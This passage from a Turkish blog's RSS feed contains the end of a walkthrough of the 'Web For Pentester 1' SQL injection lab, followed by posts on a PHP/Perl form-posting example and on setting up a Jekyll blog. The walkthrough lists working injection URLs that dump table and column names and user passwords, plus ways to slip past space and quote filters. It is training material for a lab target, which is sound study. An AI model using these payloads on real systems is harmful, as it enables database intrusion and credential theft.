&lt;p&gt;Ve en son 6 da hata oluyor yani önümüze hiç bir şey çıkmıyor. Buradan 5 tane sütunumuz olduğunu anlıyoruz.&lt;strong&gt;‘%23’&lt;/strong&gt; ifadesi de (#) anlamına geliyor yani sonrasında gelen ifadeleri yok sayıyor. Bu sayede syntax hatalarından kurtuluyoruz.
Bu aşamadan sonra bilgi toplamaya başlıyoruz.İlk sütuna ve ikinci sütuna tablo ve versiyon bilgilerini bastırmak için bunu uyguluyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' union select table_name,version(),3,4,5 
from information_schema.tables %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Bütün Sütun isimleri için:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' union select column_name,2,3,4,5 
from information_schema.columns %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Tablo isimlerini normal yazarak hata alırsak onların hexadecimal karşılıklarını deneyerek sonuca ulaşabiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root' union select column_name,2,3,4,5 
from information_schema.columns where table_name = 0x7573657273 %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Sırayla aşağıdaki işlemleri uygulayarak tablodaki kullanıcı şifrelerini bulmaya çalışalım.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root' union select 
database(),2,3,4,5 %23 --&amp;gt; Kullanılan veri tabanının ismini çektiğimiz komut.

2. http://192.168.96.129/sqli/example1.php?name=root' union select table_name,2,3,4,5 
from information_schema.tables where 
table_schema = database() %23 --&amp;gt; Kullanılan tablonun adını çektiğimiz komut.

3. http://192.168.96.129/sqli/example1.php?name=root' UNION SELECT 1,column_name,3,4,5 
FROM information_schema.columns WHERE table_name=&quot;users&quot; %23 --&amp;gt; tablodaki sütunların 
isimlerini çektiğimiz komut.

4. http://192.168.96.129/sqli/example1.php?name=root' union select name,passwd,3,4,5 
from exercises.users %23 --&amp;gt; kullanıcı isimlerini ve şifrelerini çektiğimiz komut.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Çeşitli komut varyasyonları ile farklı bilgiler edinebiliriz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example 2&lt;/strong&gt;&lt;br /&gt;
      1. Soruda denediğimiz ifadenin aynısını deniyoruz ve &lt;strong&gt;‘ERROR NO SPACE’&lt;/strong&gt; yazısını görüyoruz. Buradan aralara
koyduğumuz boşluk karakterinin sorun oluşturduğunu anlıyoruz.  Syntax yapısını sağlamak için boşluk yerine tab koyabiliriz. Tabiki Tab tuşuna basarak yapabildiğimiz bir olay değil. TAB karakteri &lt;strong&gt;‘%09’&lt;/strong&gt; ile ifade edilir.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example2.php?name=root'or%091%09or'	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 3&lt;/strong&gt;&lt;br /&gt;
      ‘or 1 or’ denediğimizde  &lt;strong&gt; ‘ERROR NO SPACE’ &lt;/strong&gt;. Sonrasında bir önceki sorudaki gibi  ‘or%091%09or’ deniyoruz fakat yine aynı sonuç : &lt;strong&gt;‘ERROR NO SPACE’&lt;/strong&gt; . Boşluğa ve Tab’a izin vermiyor. Syntax yapısını sağlaması için boşluk benzeri birşey koyacağız ama ne boşluk olacak ne de tab. Biraz araştırma sonucu yorum satırı haline getirerek oralardaki karakter koyma ihtiyacından kurtuluyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example3.php?name=root'or/**/1/**/or
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 4&lt;/strong&gt;&lt;br /&gt;
      URL’nin devamına ‘or 1 or’ denediğimizde bir sonuç alamıyoruz. Birkaç denemeden sonra tırnak karakteri kullanmamamız gerektiğini anlıyoruz ve yalnızca &lt;strong&gt;or 1&lt;/strong&gt; yazarak sonuçlari listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example4.php?id=2 or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 5&lt;/strong&gt;&lt;br /&gt;
      4. soruda olduğu gibi aynı işlemi uygulayınca sonucu listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example5.php?id=2 or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 6&lt;/strong&gt;&lt;br /&gt;
      Tırnak koyup bir kontrol ediyoruz ve &lt;strong&gt;‘ERROR INTEGER REQUIRED’&lt;/strong&gt; yazısını görüyoruz. İfademizi bir Integer ile bitirmek için  or 1  yazıyoruz .&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example6.php?id=2 or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 7&lt;/strong&gt;&lt;br /&gt;
      Tırnak karakteri koyduğumuzda &lt;strong&gt;‘ERROR INTEGER REQUIRED’&lt;/strong&gt; yazısını görüyoruz. Bir önceki soruda olduğu gibi or 1 yazıp deniyoruz ama aynı hata devam ediyor. Burada integer isteyen yerin bizim ifademizden önce gelen yer olduğunu deneyerek buluyoruz.&lt;strong&gt;‘%0A’&lt;/strong&gt; karakteri alt satıra geçme anlamına geliyor. Bunu kullanarak aşağıdaki ifade sonuçları listeliyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example7.php?id=2%0A or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 8&lt;/strong&gt;&lt;br /&gt;
      Burada &lt;strong&gt;order&lt;/strong&gt; kelimesini görünce order yapısıyla ilgili sorgular göndermeye çalışıyoruz. Düz tırnak gönderdiğimizde bir sonuç alamıyoruz ve denemeler sonucu yatay tırnak(`) kullanıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. `asc %23
2. `desc %23
3. ` %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;ifadeleri işimizi görüyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example8.php?order=name`asc %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 9&lt;/strong&gt;&lt;br /&gt;
      Düz tırnak ve yatay tırnak karakterleri hata veriyor ve bunları kullanmadan deneyerek sonuçları listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. asc %23
2. desc %23
3. %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;İfadelerinden herhangi biriyle sorgumuzu çalıştırıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example9.php?order=name desc %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;
      Böylelikle &lt;strong&gt;WEB For Pentester 1 SQL Injections&lt;/strong&gt; bölümünün çözümünü tamamlamış olduk. Tüm sorular için aynı detaya inme gereği duymadık ilk sorudaki sorgulardan yola çıkarak aynı sonuçları elde edebilirsiniz.&lt;/p&gt;

</description>
      </item>
    
      <item>
        <title>PHP ve Perl Kullanarak HttpApi Oluşturma</title>
        <link>http://localhost:4000/http-api</link>
        <pubDate>Wed, 15 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      Günlük hayatta standart olarak görebileceğimiz veri kaydeden&lt;strong&gt;(Register Form)&lt;/strong&gt; bir WEB 
uygulaması var elimizde. Uygulama sizden bir takım veriler istiyor ve aldığı 
verileri bir text dosyasına yazıyor .Bu bir database’de olabilirdi. Biz bu 
işleme &lt;strong&gt;‘Post Method’&lt;/strong&gt; diyoruz. Örneğimizde Standart bir form oluşturduk ve 
bu forma girdiğimiz verileri, PHP komutları ile alıp birer değişkene atadık.
Sonra PHP dosya işleme komutlarını (fopen,fwrite) kullanarak bunlara bir text
dosyasına yazdırdık. Bu söylediğimiz gibi bir Database’de olabilirdi.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
 

$name = $_POST[&quot;name&quot;];
$surname = $_POST[&quot;surname&quot;];


$myfile = fopen(&quot;data.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
  
fwrite($myfile, $name);
fwrite($myfile, $surname);
fclose($myfile);
echo $name;
echo $surname;

 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      İkinci aşama olarak Perl dilini kullanarak POST işlemi gerçekleş-
tirmeye çalıştık. &lt;strong&gt;‘LWP::UserAgent’&lt;/strong&gt; sınıfını import ettik ve burada
 tanımlı ‘POST’ işlemi ile hedef siteye POST işlemi gerçekleştirdik.
 Post fonksiyonu parametre olarak URL ve post edilecek verileri alıyor. Bu 
program sayesinde tarayıcıdan giriş yapmadanda uygulamaya verileri ‘POST’
edebilirsiniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;strict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;LWP::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;UserAgent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$isim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ctr1l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$soyisim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Plus'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://localhost/HttpApi/testpost.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ua&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;LWP::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;UserAgent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ua&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$isim&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'surname'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$soyisim&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;decoded_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cgi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cgi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Not: LWP :: UserAgent nesneleri, web isteklerini göndermek için kullanılabilir.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Not: CGI , HTTP isteklerini ve yanıtlarını hazırlamak için kullanılır.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;       İçeride kullanılan HTML yapısı da basit bir biçimde şu biçimdedir:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;style.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;testpost.php&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cont&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt; REGISTER!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

 	Name : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
Surname : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;surname&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
	Register  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Go&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
      </item>
    
      <item>
        <title>Jekyll İle Blog Oluşturma</title>
        <link>http://localhost:4000/jekyll-ile-blog-kurulumu</link>
        <pubDate>Tue, 14 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      Jekyll , Ruby kullanılarak yazılmış bir statik site üreticisidir. Jekyll, markdown ve scss formatında yazdığımız yazıları html ve css kodlarına çevirerek  sitemizi üretir. Bilgisayarımıza ‘RubyGems’ ile jekyll kurmak için aşağıdaki komutu terminale yazabilirsiniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gem install jekyll 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Jekyll artık kuruldu. Şimdi statik blog sitemizi oluştuma aşamasına geçebiliriz. Site klasörümüzü 
oluştumak istediğimiz dizine gidip aşağıdaki komutları girerek site klasörünü meydana getirebiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jekyll new klasor_adi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Klasörümüz oluşturuldu. İlk komut ile dosyaların olduğu dizine gidip sonrasında ikinci komut ile sitemizi
localhost’umuzda yayınlayabiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd klasor_adi

jekyll serve 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Çalışan servisi tarayıcımızdan http://localhost:4000 adresine giderek görebiliriz. Burada Jekyll’ ın bize 
default olarak oluşturduğu siteyi göreceğiz. &lt;a href=&quot;http://jekyllthemes.org/&quot;&gt;http://jekyllthemes.org/&lt;/a&gt; adresini ziyaret ederek buradan çevrimiçi tema edinip ,doğrudan  veya üzerinde değişiklikler yaparak kendi blogumuzu düzenleyebiliriz.&lt;/p&gt;

&lt;p&gt;      Oluşturduğumuz siteyi github üzerinden yayınlamak için öncelikle bir github hesabımız olması gerekiyor.
&lt;a href=&quot;https://github.com/&quot;&gt;https://github.com/&lt;/a&gt; adresini ziyaret ederek bir github hesabi açabiliriz. Oturum açıp profile girdikten sonra Repository bölümüne gelip buradan da new butonuna tıklayarak yenir bir repository oluşturabiliriz.
Bu repository bizim blogumuzdaki tüm dosyaları tutacak yer olacak. Repository ‘nin adı, &lt;strong&gt;githubkullaniciadi.github.io&lt;/strong&gt; şeklinde olmalıdır. Böylece blog sayfamız için gereken repository ‘i
 oluşturmuş olduk.  Şimdi sitemizi bu repository ‘e yollamaya geldi. Bundan önce sitemizi localhost’dan çıkarıp tüm ağlarda tanınır hale getirecek olduğumuz için site klasörümüz içerisindeki &lt;strong&gt;_config.yml&lt;/strong&gt; dosyasında bir değişiklik yapmamız gerekiyor. Buradaki&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;url : “”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;kısmını&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;url : “https://githubkullaniciadi.github.io”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;olarak düzenliyoruz.&lt;/p&gt;

&lt;p&gt;      Şimdi sıra geldi dosyalarımız github repository’ imize yollamaya. Bunun için terminale gelip aşağıdaki komutları yazabiliriz ve dosyalarımızı gönderebiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd klasor_adi

git init

git remote add origin https://github.com/githubkullaniciadi/githubkullaniciadi.github.io.git

git add -A

git commit -m &quot;gönderi&quot;

git push origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Jekyll kullanımı kolay ve github üzerinden çalışabilen güncel bir servistir. Değişiklikler anlamında daha fazla hareket edebilmek ve kullanışlı olması açısından  için &lt;strong&gt;Markdown&lt;/strong&gt; syntax yapısı araştırılabilir.&lt;/p&gt;

</description>
      </item>
    

  </channel>
</rss>
